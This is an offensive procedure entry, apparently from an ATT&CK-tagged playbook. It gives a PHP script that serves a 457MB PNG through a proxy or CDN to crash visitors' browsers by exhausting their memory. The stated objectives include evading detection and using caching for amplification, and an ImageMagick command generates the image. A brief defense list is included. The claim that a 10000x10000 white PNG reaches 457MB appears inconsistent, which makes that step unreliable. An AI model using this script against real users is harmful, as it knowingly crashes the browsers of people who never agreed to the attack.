---
id: proc-create-big-valid-php-001
tags:
  - large-image
  - png
  - browser-crash
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:48.942Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Create-Valid-Large-PNG-Script

## Summary

This procedure creates big_valid.php to serve a 457MB valid PNG image using chunked encoding and HTTP 200, causing browser crashes when loaded via the proxy due to excessive memory usage.

## Description

By using readfile on a pre-generated large PNG, the script delivers legitimate image data that proxies and browsers attempt to process fully, leading to end-user impacts like Chrome crashes. CDN caching reduces attacker bandwidth needs.

## Requirements

1. A large PNG file (e.g., really_big.png, 457MB) on server
2. PHP setup ([[procedures/Setup-Attacker-Web-Server-with-PHP]])

## Defense

Defensive measures and detection strategies:

- Size-limit image processing in browsers/proxies (e.g., 100MB)
- Scan for oversized valid images in asset fetches
- Client-side image size validation

## Objectives

1. Deliver valid content to evade detection
2. Crash browsers via memory exhaustion
3. Leverage CDN for amplification

## Instructions

### Step 1: Prepare and Write Script

**Context**: Use readfile for efficient serving.

Create /var/www/html/big_valid.php:

```php
<?php
header('HTTP/1.1 200 OK');
header('Content-Type: image/png');
header('Transfer-Encoding: chunked');
readfile('really_big.png');
?>
```

> Expected output: Serves full 457MB PNG when accessed.

### Step 2: Generate Test PNG if Needed

**Context**: Create large PNG for testing.

Use tools like ImageMagick: convert -size 10000x10000 xc:white really_big.png

> Expected output: 457MB+ PNG file.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]

## Tags

- large-image
- browser-dos
